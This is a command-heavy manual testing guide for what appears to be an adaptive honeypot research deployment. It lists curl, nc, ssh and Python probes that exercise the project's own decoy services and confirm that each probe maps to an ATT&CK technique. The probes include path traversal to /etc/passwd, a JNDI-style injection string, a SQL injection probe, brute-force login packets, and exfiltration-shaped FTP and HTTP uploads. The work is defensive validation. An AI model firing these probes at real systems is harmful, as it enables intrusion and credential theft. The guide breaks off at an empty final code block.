# Attack Testing Guide

This guide is only for live/manual verification on the VM at `146.169.44.23`. Use host-facing browser or terminal traffic; avoid `docker run --network ...` for attacker traffic because it creates Docker bridge source IPs.

This file is intentionally command-heavy; design details are in `ARCHITECTURE.md`, and offline metrics are in `EVALUATION.md`.

## 1. Start

```bash
./scripts/reset_enterprise_runtime.sh # Clear previous bindings, routes, observations, and runtime containers.

./scripts/start_enterprise_stack.sh # Start the public portal, controller/orchestrator services, dashboard, forwarders, and enterprise compose slice.
```

Optional local tunnel for browser testing:

The tunnel maps local browser ports to the VM-facing services: public portal (`18000`), dashboard (`18090`), internal HTTP assets (`18180`, `18089`, `18082`, `18085`, `18443`), protocol assets (`19419`, `13306`, `16379`, `12121`, `12222`, `12323`, `12525`), high-interaction ports (`11445`, `11433`, `12122`, `19999`), and admin jumpbox (`10222`).

```bash
# Keep this terminal open while browsing from your laptop.
ssh -N \
  -L 127.0.0.1:18000:146.169.44.23:8080 \
  -L 127.0.0.1:18090:146.169.44.23:8090 \
  -L 127.0.0.1:18180:146.169.44.23:18080 \
  -L 127.0.0.1:18089:146.169.44.23:18081 \
  -L 127.0.0.1:18082:146.169.44.23:18082 \
  -L 127.0.0.1:18085:146.169.44.23:18085 \
  -L 127.0.0.1:18443:146.169.44.23:18443 \
  -L 127.0.0.1:19419:146.169.44.23:19418 \
  -L 127.0.0.1:13306:146.169.44.23:13306 \
  -L 127.0.0.1:16379:146.169.44.23:16379 \
  -L 127.0.0.1:12121:146.169.44.23:12121 \
  -L 127.0.0.1:12222:146.169.44.23:12222 \
  -L 127.0.0.1:12323:146.169.44.23:12323 \
  -L 127.0.0.1:12525:146.169.44.23:2525 \
  -L 127.0.0.1:11445:146.169.44.23:1445 \
  -L 127.0.0.1:11433:146.169.44.23:11433 \
  -L 127.0.0.1:12122:146.169.44.23:12122 \
  -L 127.0.0.1:19999:146.169.44.23:19999 \
  -L 127.0.0.1:10222:146.169.44.23:10222 \
  vm
```

Open browser pages with `127.0.0.1` instead of `localhost`, for example `http://127.0.0.1:18180/`, so the browser does not choose the IPv6 localhost path.

Optional route-level engineering check:

Use this only when you want to check that the reveal pipeline can open the expected fixed ports. It replays scripted profiles, asks the controller what route would be exposed, applies the orchestrator action, and verifies that `data/runtime/asset_gateway_routes.json` contains the expected `asset_id` + public port route. It is not a behaviour evaluation: it does not simulate attacker commands, browser clicks, protocol probes, or Sigma-to-technique coverage. Those are covered by the manual probes below and the entrypoint coverage tests.

```bash
# Replay route scenarios and apply the selected controller actions to the live runtime.
.venv/bin/python scripts/evaluation/reveal_port_simulation.py \
  --mode live-apply \
  --scenario-file tests/fixtures/reveal_port_scenarios.json \
  --output data/runtime/reveal_port_simulation_report.json

# Print the summary plus per-scenario selected assets and route checks.
jq '.summary, .scenarios[] | {scenario_id, ok, selected_assets, expected_routes, actual_routes, failure_reason}' \
  data/runtime/reveal_port_simulation_report.json
```

Expected: each passed scenario has the selected asset and the exact asset-gateway route. A failed runtime is reported explicitly, not silently skipped.

This evaluation creates routes for scripted attacker keys such as `198.51.100.x`. To probe the fixed ports from this VM shell or browser, still run section 4 with the real source IP key, normally `146.169.44.23`.

Optional configuration variant live checks:

Use this after the enterprise stack is running when you want to prove that A.2 configuration variants are real attacker-visible changes. The helper below calls the private control-plane API from Docker, but every probe command uses the attacker-facing host/port. Reconnect after applying a variant; existing TCP sessions are not preserved. The `tests T...` comments name the ATT&CK techniques expected from that exact probe; a visible note may test a narrower technique than the variant's full follow-up intent.

```bash
# Pick the latest attacker key seen by the public portal; fall back to the VM public IP.
TEST_ATTACKER_KEY="$(
  curl -s "http://146.169.44.23:8090/api/summary" |
    jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
)"
```

HTTP content variants:

```bash
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh internal-portal portal-api-directory-links # Apply the portal service-directory configuration for this attacker binding.

curl -fsS "http://146.169.44.23:18080/api/openapi-summary.json" | grep -F "Operations Directory API" # tests T1046/T1018: service/API directory access.

curl -fsS "http://146.169.44.23:18080/runbooks/service-directory.md" | grep -F "service-directory" # tests T1046/T1018: runbook-host inventory interest.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh internal-portal portal-admin-console-link # Apply the portal admin-link configuration for this attacker binding.

curl -fsS "http://146.169.44.23:18080/runbooks/admin-console-access.md" | grep -F "Maintenance Access" # tests T1213: reading the per-binding admin-console runbook.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh finance-share finance-backup-archive-index # Apply the finance archive-index configuration.

curl -fsS "http://146.169.44.23:18082/finance/archive/2024/customer-export-index.csv" | grep -F "customer-export" # tests T1005: finance archive index access.

curl -fsS "http://146.169.44.23:18082/finance/archive/2024/archive-manifest.txt" | grep -F "Finance archive manifest" # tests T1005: finance archive manifest access.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh finance-share finance-password-rotation-clue # Apply the finance password-rotation note configuration.

curl -fsS "http://146.169.44.23:18082/finance/archive/2024/password-rotation-note.txt" | grep -F "password rotation" # tests T1213: reading a credential-process note; actual credential reuse is tested by follow-up login probes.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh web-admin-console web-admin-login-surface # Apply the web-admin login-surface configuration.

curl -fsS "http://146.169.44.23:18081/login/" | grep -F "Northbridge Admin Console" # visibility only: page load confirms the login page exists; the POST below tests T1110.

curl -fsS -X POST "http://146.169.44.23:18081/login" -d "username=admin&password=x" >/dev/null || true # tests T1110: failed admin-console login attempt.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh web-admin-console web-admin-discovery-endpoints # Apply the web-admin discovery endpoint configuration.

curl -fsS "http://146.169.44.23:18081/api/inventory.json" | grep -F "svc-admin-console" # tests T1518: software/inventory discovery.

curl -fsS "http://146.169.44.23:18081/api/processes.json" | grep -F "admin-console" # tests T1057: process discovery.

curl -fsS "http://146.169.44.23:18081/api/groups.json" | grep -F "platform" # tests T1069: permission-group discovery.

curl -fsS "http://146.169.44.23:18081/api/container-resources.json" | grep -F "ops-prod-a" # tests T1082: system/container resource discovery.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh vpn-appliance vpn-profile-login-clue # Apply the VPN profile/login-clue configuration.

curl -fsS "http://146.169.44.23:18443/policy/login-clue.txt" | grep -F "Remote access profile" # tests T1133: external remote-service profile clue.

curl -fsS "http://146.169.44.23:18443/download/contractor-profile.ovpn" | grep -F "auth-user-pass" # tests T1133: contractor VPN profile download.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh vpn-appliance vpn-route-policy-notes # Apply the VPN route-policy note configuration.

curl -fsS "http://146.169.44.23:18443/policy/route-policy-notes.txt" | grep -F "Split-tunnel" # tests T1016: route-policy note access.

curl -fsS "http://146.169.44.23:18443/policy/tunnel-routes.txt" | grep -F "Split tunnel" # tests T1572: tunnel route list access.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-downloader-staging-directory # Apply the malware-sink downloader staging configuration.

curl -fsS "http://146.169.44.23:18085/staging/downloader-index.txt" | grep -F "endpoint package" # tests T1608: downloader/resource staging index access.

curl -fsS "http://146.169.44.23:18085/downloads/agent-update.bin" >/dev/null # tests T1105: staged downloader binary request.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-upload-drop-endpoint # Apply the malware-sink upload/drop endpoint configuration.

curl -fsS "http://146.169.44.23:18085/upload/drop-endpoint.txt" | grep -F "Upload intake endpoint" # visibility only: drop-endpoint note read; the POST below tests T1567.

curl -fsS -X POST "http://146.169.44.23:18085/upload/" -d "filename=finance-drop.zip" >/dev/null || true # tests T1567: upload/exfil-shaped POST to the exposed drop endpoint.
```

Protocol target-runtime variants:

```bash
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh git-internal git-seeded-repository-backend # Swap Git from base canary to the seeded Git daemon.

timeout 8s git ls-remote git://146.169.44.23:19418/infra-deploy.git | head # tests T1046/T1213: Git service and repository access.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh redis-cache redis-seeded-keyspace-backend # Swap Redis to the seeded keyspace backend.

# tests T1046/T1213: Redis keyspace discovery.
printf "KEYS *\r\n" | nc -w 3 146.169.44.23 16379 | grep -F "session:portal.reader"

# tests T1046/T1005: Redis seeded value read.
printf "GET session:portal.reader\r\n" | nc -w 3 146.169.44.23 16379 | grep -F "nbp_reader"

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ftp-archive ftp-archive-review-banner # Swap FTP to the configured archive banner backend.

# tests T1110/T1021: FTP USER probe; banner visibility is checked by grep.
printf "USER archive\r\n" | nc -w 3 146.169.44.23 12121 | grep -F "archive-ftpd.internal.local"

# tests T1110/T1021/T1039: FTP login and archive retrieval attempt.
printf "USER anonymous\r\nPASS anonymous\r\nRETR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 146.169.44.23 12121 || true

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ops-db ops-db-schema-banner-backend # Swap ops-db to the configured MySQL-compatible banner backend.

# visibility check: MySQL handshake is visible without using the Docker bridge.
python3 - <<'PY'
import socket
s = socket.create_connection(("146.169.44.23", 13306), timeout=5)
print(s.recv(512).decode("latin1", errors="replace"))
s.close()
PY

# tests T1110: MySQL login attempt against the configured database surface.
python3 - <<'PY'
import socket
import struct
username = b"backup_reader"
password = b"WrongPassword"
with socket.create_connection(("146.169.44.23", 13306), timeout=5) as sock:
    sock.recv(4096)
    capabilities = 0x00000001 | 0x00000200 | 0x00008000 | 0x00080000
    payload = struct.pack("<IIB23s", capabilities, 16777216, 33, b"\0" * 23)
    payload += username + b"\0" + bytes([len(password)]) + password + b"mysql_native_password\0"
    sock.sendall(struct.pack("<I", len(payload))[:3] + b"\x01" + payload)
    print(sock.recv(4096).decode("utf-8", errors="replace"))
PY

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh ssh-canary ssh-cowrie-jumpbox-profile # Swap the SSH canary to Cowrie.

ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true # visibility check: route accepts a client connection; failure is expected because BatchMode avoids password entry.

# tests T1021.004/T1110: one SSH password attempt.
tmpask="$(mktemp)"; printf '#!/bin/sh\necho wrongpass\n' > "$tmpask"; chmod +x "$tmpask"; DISPLAY=:0 SSH_ASKPASS="$tmpask" SSH_ASKPASS_REQUIRE=force setsid ssh -o NumberOfPasswordPrompts=1 -o PubkeyAuthentication=no -o PreferredAuthentications=password -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true; rm -f "$tmpask"

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh legacy-telnet legacy-telnet-console-prompt # Swap Telnet to the legacy console prompt backend.

# tests T1021/T1110: configured legacy console login-path probe.
printf "admin\r\n" | nc -w 3 146.169.44.23 12323 | grep -F "Northbridge legacy console"

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh mail-relay mailoney-auth-relay-backend # Swap SMTP to Mailoney.

# tests T1046: SMTP banner/relay interaction.
printf "EHLO tester\r\nQUIT\r\n" | nc -w 3 146.169.44.23 2525 | grep -F "Python SMTP proxy"

# tests T1087.003/T1110: SMTP recipient probing and AUTH attempt.
printf "EHLO tester\r\nVRFY finance\r\nAUTH LOGIN\r\nYWRtaW4=\r\nV3JvbmdQYXNz\r\nQUIT\r\n" | nc -w 4 146.169.44.23 2525 || true

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh admin-jumpbox jumpbox-cowrie-operator-profile # Swap the admin jumpbox to its Cowrie operator profile.

ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 10222 root@146.169.44.23 true </dev/null || true # visibility check: jumpbox SSH route accepts a client connection.
```

High-interaction target variants:

```bash
ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh dionaea-capture dionaea-to-glutton-http-capture # Apply the Dionaea-to-Glutton adjacent HTTP capture route.

# tests T1190/T1105 through generic high-interaction capture. This probe may not return an HTTP page; the expected effect is capture telemetry.
printf "GET /config-check HTTP/1.1\r\nHost: capture.local\r\n\r\n" | nc -w 3 146.169.44.23 19999 || true

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-dionaea-same-port-upgrade # Apply the malware-sink same-port Dionaea upgrade.

curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" | head # tests T1041/T1105/T1190/T1204.002 when latest 18085 route points to Dionaea.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh malware-sink malware-honeytrap-generic-listener # Apply the malware-sink adjacent generic capture listener.

# tests T1046/T1105/T1190 through generic TCP capture.
printf "payload upload test\r\n" | nc -w 3 146.169.44.23 19999 || true

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/apply_configuration_variant_for_test.sh honeytrap-generic honeytrap-wordpot-web-capture # Swap generic capture to Wordpot.

curl -i "http://146.169.44.23:19999/wp-login.php" | grep -F "Wordpress" # tests T1190/T1046: WordPress-like exploit/probe surface.
```

Expected: each `apply_configuration_variant_for_test.sh` response shows a route update and either `configured_runtime: true` for same-port swaps or a newly exposed target asset. Each probe returns the expected visible string or successful protocol handshake within a reconnect.

## 2. Public Signals

Run this from the same terminal/browser source IP that will later test internal ports:

```bash
curl -i "http://146.169.44.23:8080/" # Baseline page load; verifies public portal access logging.

curl -i "http://146.169.44.23:8080/.env.old" # Public credential/config breadcrumb; should trigger credential/config discovery evidence.

curl -i "http://146.169.44.23:8080/backup/passwords_internal.txt" # Public password-file breadcrumb; should strengthen credential-access evidence.

curl -i "http://146.169.44.23:8080/backup/db_backup_2024.sql.bak" # Public backup breadcrumb; should trigger backup/archive discovery evidence.

curl -i "http://146.169.44.23:8080/assets/app.js.map" # Source-map breadcrumb; should support developer/Git-path reveal decisions.

curl -i "http://146.169.44.23:8080/admin" # Admin path probe; should support admin-console reveal decisions.

curl -i "http://146.169.44.23:8080/.git/config" # Exposed Git config probe; should support Git/developer surface interest.

curl -i "http://146.169.44.23:8080/phpinfo.php" # PHP info probe; scanner/discovery signal.

curl -i -X POST "http://146.169.44.23:8080/login" -d "username=admin&password=WrongPassword" # Failed login attempt; should map to credential/login probing evidence.

curl -i -A "sqlmap/1.8 live-test" "http://146.169.44.23:8080/api/search?q=1%20union%20select%201" # SQL injection scanner probe; should map to exploit/scanner evidence.

curl -i "http://146.169.44.23:8080/internal-api/status" # Internal API breadcrumb from the public surface; supports portal/admin dependency markers.

curl -i "http://146.169.44.23:8080/view?file=../../../../etc/passwd" # Local file inclusion/path traversal probe.

curl -i "http://146.169.44.23:8080/lookup?x=%24%7Bjndi%3Aldap%3A%2F%2Fexample.test%2Fa%7D" # JNDI-style exploit probe.

sleep 2 # Give forwarders and the profiler a moment to ingest observations.

curl -s "http://146.169.44.23:8090/api/summary" | jq '{recent_entrypoint_observations: [.recent_entrypoint_observations[] | {attacker_key, path, matched_rules, indicators, profiler_evidence_ids}], attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, public_http_evidence, unlocked_assets}]}' # Confirm public observations became profiler evidence and updated the attacker profile.
```

Expected: suspicious public paths have `matched_rules`, non-empty `profiler_evidence_ids`, and the attacker profile shows HTTP evidence.

## 3. Cowrie SSH Smoke

Connect to Cowrie:

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@146.169.44.23 # Open an interactive Cowrie SSH session through the public SSH honeypot port.
```

Type these inside Cowrie:

```bash
whoami # User discovery.

id # User/group discovery.

uname -a # Host/system discovery.

cat /etc/passwd # Account-file discovery.

curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin # Tool transfer attempt against the malware sink route.

chmod +x /tmp/agent-update.bin # Permission change on downloaded tool.

history -c # Indicator removal.

exit # End the Cowrie session.
```

Expected minimum mappings:

| Command | Expected technique |
| --- | --- |
| `whoami` | `T1033` |
| `id` | `T1033`, `T1087.001` |
| `uname -a` | `T1033`, `T1082` |
| `cat /etc/passwd` | `T1087.001` |
| `curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin` | `T1105` |
| `chmod +x /tmp/agent-update.bin` | `T1222.002` |
| `history -c` | `T1070.003` |

```bash
sleep 2 # Wait for Cowrie forwarder and profiler ingestion.

curl -s "http://146.169.44.23:8090/api/summary" | jq '{cowrie: [.recent_cowrie_observations[] | {eventid, attacker_key, command, profiler_evidence_ids}], attackers: [.attackers[] | {attacker_key, commands, recent_tactics, recent_techniques, unlocked_assets}]}' # Confirm Cowrie observations and mapped techniques reached the dashboard/profile.
```

## 4. Unlock Fixed-Port MVP Assets

This is the manual test-mode path. It force-unlocks fixed-port MVP assets through the normal orchestrator API for the observed attacker key. High-interaction assets are validated separately because they need their runtime backend and telemetry forwarder to be reachable.

```bash
# Reuse the latest public-portal attacker key so routes match this source IP.
TEST_ATTACKER_KEY="$(
  curl -s "http://146.169.44.23:8090/api/summary" |
    jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
)"

echo "$TEST_ATTACKER_KEY" # Print the chosen attacker key for sanity.

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh # Force-unlock the standard fixed-port internal assets for this attacker.

sleep 3 # Wait for orchestrator route writes and backend startup.

jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip) | .asset_id] | unique' data/runtime/asset_gateway_routes.json # Verify routes exist for this exact attacker key.
```

Expected: the route list includes `internal-portal`, `finance-share`, `git-internal`, `ops-db`, `redis-cache`, `web-admin-console`, `ftp-archive`, `ssh-canary`, `legacy-telnet`, `mail-relay`, `vpn-appliance`, and `malware-sink`. Extra naturally unlocked assets may also appear if the adaptive loop already acted.

## 5. Full Internal Smoke

Run this from the same source IP used above:

```bash
# static HTTP assets
curl -i "http://146.169.44.23:18080/" || true # Internal portal landing page; proves the portal route is open.

curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=WrongToken" || true # Invalid internal-portal credential reuse; should produce failed login evidence.

curl -i -X POST "http://146.169.44.23:18080/session" -d "username=portal.reader&token=nbp_reader_2026_04_window" || true # Valid internal-portal credential reuse; should produce valid-token evidence.

curl -i "http://146.169.44.23:18081/" || true # Web admin landing page.

curl -i "http://146.169.44.23:18081/api/status" || true # Web admin status endpoint discovery.

curl -i "http://146.169.44.23:18082/" || true # Finance share landing page.

curl -i "http://146.169.44.23:18082/finance/archive/2024/budget-q4-review.xlsx" || true # Finance archive file access.

curl -i "http://146.169.44.23:18082/finance/archive/2024/payroll-archive.zip" || true # Finance staged archive access.

curl -i "http://146.169.44.23:18082/exports/db_backup_2024.sql.bak" || true # Finance backup file access.

curl -i "http://146.169.44.23:18443/" || true # VPN landing page.

curl -i "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true # VPN backup request without credentials.

curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/backup/ra-config-2026-04.bak" || true # VPN backup request with planted contractor credential.

curl -i -u "contractor.ops:RemoteAccess-0426" "http://146.169.44.23:18443/download/contractor-profile.ovpn" || true # VPN profile download with planted contractor credential.

curl -i "http://146.169.44.23:18085/" || true # Malware sink landing page.

curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true # Malware/tool download request.

curl -i "http://146.169.44.23:18085/upload/README.txt" || true # Malware upload/drop endpoint note.

# OpenCanary / protocol assets
timeout 8s git ls-remote git://146.169.44.23:19418/infra-deploy.git || true # Git repository discovery.

# Redis service discovery.
printf "INFO\r\n" | nc -w 2 146.169.44.23 16379 || true

# Redis key enumeration.
printf "KEYS *\r\n" | nc -w 2 146.169.44.23 16379 || true

# Redis config/credential-oriented probing.
printf "CONFIG GET *\r\n" | nc -w 2 146.169.44.23 16379 || true

# FTP login plus file retrieval.
printf "USER anonymous\r\nPASS anonymous\r\nRETR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 146.169.44.23 12121 || true

# FTP upload/exfiltration-shaped attempt.
printf "USER anonymous\r\nPASS anonymous\r\nSTOR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 146.169.44.23 12121 || true

timeout 8s ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@146.169.44.23 true </dev/null || true # SSH credential attempt against the canary.

# Telnet login prompt interaction.
{ sleep 1; printf "admin\r\n"; sleep 1; printf "admin123\r\n"; sleep 1; } | nc -w 8 146.169.44.23 12323 || true

# SMTP discovery, account probing, and auth attempt.
printf "EHLO tester\r\nVRFY admin\r\nAUTH LOGIN\r\nYWRtaW4=\r\nV3JvbmdQYXNz\r\nQUIT\r\n" | nc -w 3 146.169.44.23 2525 || true

# MySQL-compatible login packet; should create DB credential/login telemetry.
python3 - <<'PY'
import socket
import struct

host = "146.169.44.23"
port = 13306
username = b"backup_reader"
password = b"WrongPassword"

try:
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.recv(4096)
        capabilities = 0x00000001 | 0x00000200 | 0x00008000 | 0x00080000
        payload = struct.pack("<IIB23s", capabilities, 16777216, 33, b"\0" * 23)
        payload += username + b"\0" + bytes([len(password)]) + password + b"mysql_native_password\0"
        sock.sendall(struct.pack("<I", len(payload))[:3] + b"\x01" + payload)
        print(sock.recv(4096).decode("utf-8", errors="replace"))
except OSError as exc:
    print(f"MySQL probe failed: {exc}")
PY
```

Check:

```bash
sleep 3 # Let internal HTTP/protocol forwarders and profiler process events.

curl -s "http://146.169.44.23:8090/api/summary" | jq '{asset_gateway_routes, recent_opencanary_observations, attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, internal_http_evidence, unlocked_assets}]}' # Inspect routes, recent protocol observations, and the resulting attacker profile.

# Require observed telemetry for every fixed-port asset touched in this smoke.
.venv/bin/python scripts/validation/asset_telemetry.py \
  --asset-id internal-portal \
  --asset-id finance-share \
  --asset-id git-internal \
  --asset-id ops-db \
  --asset-id redis-cache \
  --asset-id web-admin-console \
  --asset-id ftp-archive \
  --asset-id ssh-canary \
  --asset-id legacy-telnet \
  --asset-id mail-relay \
  --asset-id vpn-appliance \
  --asset-id malware-sink \
  --require-observed
```

Expected: static HTTP assets produce internal HTTP evidence; Git/MySQL/Redis/FTP/SSH/Telnet/SMTP produce `recent_opencanary_observations` and update attacker tactics/techniques.

## 6. High-Interaction And Capture Runtime Smoke

Use this after the fixed-port smoke when you want to verify upgraded capture backends. These commands force-unlock Dionaea plus the generic TCP capture asset for the same attacker key, then probe their gateway-managed ports.

```bash
# Reuse the latest attacker key so high-interaction routes match this source IP.
TEST_ATTACKER_KEY="$(
  curl -s "http://146.169.44.23:8090/api/summary" |
    jq -r '.recent_entrypoint_observations | .[0].attacker_key // "146.169.44.23"'
)"

ATTACKER_KEY="$TEST_ATTACKER_KEY" ./scripts/unlock_internal_assets_for_test.sh --assets dionaea-capture,honeytrap-generic # Force-unlock Dionaea and generic capture backends.

sleep 10 # Give Docker backends and sidecar forwarders time to start.

jq --arg ip "$TEST_ATTACKER_KEY" '[.routes[] | select(.attacker_key == $ip and (.asset_id == "dionaea-capture" or .asset_id == "honeytrap-generic")) | {asset_id, public_port, backend_host, backend_port}]' data/runtime/asset_gateway_routes.json # Verify gateway routes for the two high-interaction assets.
```

Probe the high-interaction routes:

```bash
# Dionaea HTTP/SMB/MSSQL/FTP-facing ports
curl -i "http://146.169.44.23:18085/downloads/agent-update.bin" || true # Dionaea HTTP payload/download-like request.

# Dionaea SMB-facing probe.
printf "\x00\x00\x00\x90" | nc -w 3 146.169.44.23 1445 || true

# Dionaea MSSQL-facing probe.
printf "\x12\x01\x00\x34" | nc -w 3 146.169.44.23 11433 || true

# Dionaea FTP-facing login probe.
printf "USER anonymous\r\nPASS anonymous\r\nQUIT\r\n" | nc -w 3 146.169.44.23 12122 || true

# Generic TCP capture port
# Generic capture payload/probe.
printf "payload upload test\r\n" | nc -w 3 146.169.44.23 19999 || true
```

Check:

```bash
sleep 5 # Let high-interaction forwarders ingest backend/gateway probe events.

curl -s "http://146.169.44.23:8090/api/summary" | jq '{recent_high_interaction_observations, high_interaction_events: .event_counts.high_interaction, attackers: [.attackers[] | {attacker_key, recent_tactics, recent_techniques, unlocked_assets}]}' # Check dashboard-facing high-interaction observations and profile updates.

.venv/bin/python scripts/validation/asset_telemetry.py --asset-id dionaea-capture --asset-id honeytrap-generic --require-observed # Require observed telemetry for the high-interaction assets.
```

Expected: the selected assets have runtime records, asset-gateway routes, dashboard running state, and either `recent_high_interaction_observations` or raw high-interaction/internal HTTP telemetry. If a runtime fails, the validation report should show the failed asset instead of silently passing.

## 7. Manual Technique Coverage Smoke

Run the HTTP, protocol, and Cowrie blocks after section 4 and before section 6 if you want a manual smoke that touches every catalog-covered technique at least once. The Dionaea upgrade reuses `18085`, so the static `malware-sink` paths must be touched before the latest route on that port is changed to `dionaea-capture`. After those blocks, run section 6, then come back for the high-interaction and generic capture block plus the final check.

Set the target once:

```bash
TARGET="146.169.44.23" # Public VM host used by all probes in this section.

DASHBOARD="http://${TARGET}:8090" # Dashboard/API endpoint used for final profile checks.
```

HTTP surfaces:

```bash
curl -i "http://${TARGET}:18080/directory/hosts.csv" || true                         # T1018 # Internal portal, admin, VPN, finance, and malware sink HTTP paths
curl -i -X POST "http://${TARGET}:18080/session" -d "username=portal.reader&token=nbp_reader_2026_04_window&auth_result=success" || true  # T1021, T1078
curl -i "http://${TARGET}:18081/api/processes.json" || true                         # T1057
curl -i "http://${TARGET}:18081/api/groups.json" || true                            # T1069
curl -i "http://${TARGET}:18081/api/container-resources.json" || true               # T1082
curl -i "http://${TARGET}:18081/api/inventory.json" || true                         # T1518
curl -i -X POST "http://${TARGET}:18081/login" -d "username=admin&password=x" || true # T1110
curl -i "http://${TARGET}:18082/finance/archive/2024/payroll-archive.zip" || true    # T1005
curl -i "http://${TARGET}:18085/downloads/agent-update.bin" || true                 # T1105
curl -i "http://${TARGET}:18085/staging/archive-plan.txt" || true                   # T1074
curl -i "http://${TARGET}:18085/staging/manifest.json" || true                      # T1608
curl -i -X POST "http://${TARGET}:18085/upload/" -d "filename=finance-drop.zip" || true # T1567
curl -i "http://${TARGET}:18443/download/contractor-profile.ovpn" || true           # T1133
curl -i "http://${TARGET}:18443/policy/tunnel-routes.txt" || true                   # T1572
```

Protocol surfaces:

```bash
timeout 8s git ls-remote "git://${TARGET}:19418/infra-deploy.git" || true            # T1213 # Git, Redis, FTP, SSH, Telnet, SMTP, and MySQL-facing lures
printf "INFO\r\n" | nc -w 2 "$TARGET" 16379 || true                                  # T1046
printf "KEYS *\r\n" | nc -w 2 "$TARGET" 16379 || true                                # T1213
printf "GET session:portal.reader\r\n" | nc -w 2 "$TARGET" 16379 || true              # T1005
printf "CONFIG GET *\r\n" | nc -w 2 "$TARGET" 16379 || true                          # T1552.001
printf "USER anonymous\r\nPASS anonymous\r\nRETR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 "$TARGET" 12121 || true # T1021, T1039, T1110
printf "USER anonymous\r\nPASS anonymous\r\nSTOR finance-drop.zip\r\nQUIT\r\n" | nc -w 4 "$TARGET" 12121 || true # T1567.002
tmpask="$(mktemp)"; printf '#!/bin/sh\necho wrongpass\n' > "$tmpask"; chmod +x "$tmpask"; DISPLAY=:0 SSH_ASKPASS="$tmpask" SSH_ASKPASS_REQUIRE=force setsid ssh -o NumberOfPasswordPrompts=1 -o PubkeyAuthentication=no -o PreferredAuthentications=password -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 12222 root@"$TARGET" true </dev/null || true; rm -f "$tmpask" # T1021.004, T1110
{ sleep 1; printf "admin\r\n"; sleep 1; printf "admin123\r\n"; sleep 1; } | nc -w 8 "$TARGET" 12323 || true # T1021, T1110
printf "EHLO tester\r\nVRFY finance\r\nAUTH LOGIN\r\nYWRtaW4=\r\nV3JvbmdQYXNz\r\nQUIT\r\n" | nc -w 4 "$TARGET" 2525 || true # T1046, T1087.003, T1110
TARGET="$TARGET" python3 - <<'PY'
import os
import socket
import struct

host = os.environ["TARGET"]
username = b"backup_reader"
password = b"WrongPassword"
try:
    with socket.create_connection((host, 13306), timeout=5) as sock:
        sock.recv(4096)
        capabilities = 0x00000001 | 0x00000200 | 0x00008000 | 0x00080000
        payload = struct.pack("<IIB23s", capabilities, 16777216, 33, b"\0" * 23)
        payload += username + b"\0" + bytes([len(password)]) + password + b"mysql_native_password\0"
        sock.sendall(struct.pack("<I", len(payload))[:3] + b"\x01" + payload)
        print(sock.recv(4096).decode("utf-8", errors="replace"))
except OSError as exc:
    print(f"MySQL probe failed: {exc}")
PY
```

After the static/protocol/Cowrie blocks complete, run section 6 if you have not already done so. Then probe high-interaction and generic capture routes:

```bash
